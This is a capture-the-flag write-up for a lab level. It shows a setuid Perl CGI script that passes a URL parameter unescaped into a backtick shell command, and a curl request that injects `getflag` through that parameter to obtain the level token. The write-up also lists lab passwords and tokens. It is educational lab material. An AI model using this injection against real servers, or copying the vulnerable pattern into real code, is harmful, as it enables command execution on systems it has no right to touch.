# Level04 - Flag04

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level04 | `qi0maab88jeaj46qoumi7maus` |
| flag04  |                             |
| token   | `ne2searoevaevoem4ov4ar8ap` |

## Steps to resolve on VM

1. Connect to `level04` user and check the repo to find a perl script with `flag04` permissions

```bash
su level04
# Enter the token

ls -l
> total 4
> -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

cat level04.pl
> #!/usr/bin/perl
> # localhost:4747
> use CGI qw{param}; # (Common Gateway Interface), a protocol for executing scripts via web requests
> print "Content-type: text/html\n\n";
> sub x { # sub for subroutine (function) with 'x' parameter here
>   $y = $_[0];
>   print `echo $y 2>&1`;
> }
> x(param("x")); # param will look at the 'x' parameter given with the link (ex: localhost:4747?x=42)

# By looking at the comments we can notice the 'localhost:4747' adress
# We will list all the listening ports with netstat
netstat -tulpn | grep LISTEN
# Which will confirm us that a server is actually running on the 4747 port
>[...]
>tcp6       0      0 :::4747                 :::*                    LISTEN      - 
>[...]
```

2. Check the server on port 4747 and try to trick it to get the flag

```bash
# First we check if we can curl
curl localhost:4747
# Now that it works indeed, we try to give x argument as we saw it in the perl script
curl localhost:4747?x=42
>42

# We need now to trick it and execute getflag
# Perl script is apparently executing 'echo' + the argument we give to him,
# so let's give him the command 'getflag' to execute it
curl 'localhost:4747?x=`getflag`' #single quote used because of backquotes
> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
---

## Sources

### SHELL

- [CGI & 'param()'](http://www.biogem.org/downloads/notes/Passing%20Parameters%20via%20CGI.pdf)
- [Perl subroutines](https://www.tutorialspoint.com/perl/perl_subroutines.htm)
- [Curl special characters](https://www.unix.com/shell-programming-and-scripting/275920-using-curl-command-special-characters-url.html)
- [Single quotes vs Double quotes](https://stackoverflow.com/questions/1824160/escape-backquote-in-a-double-quoted-string-in-shell)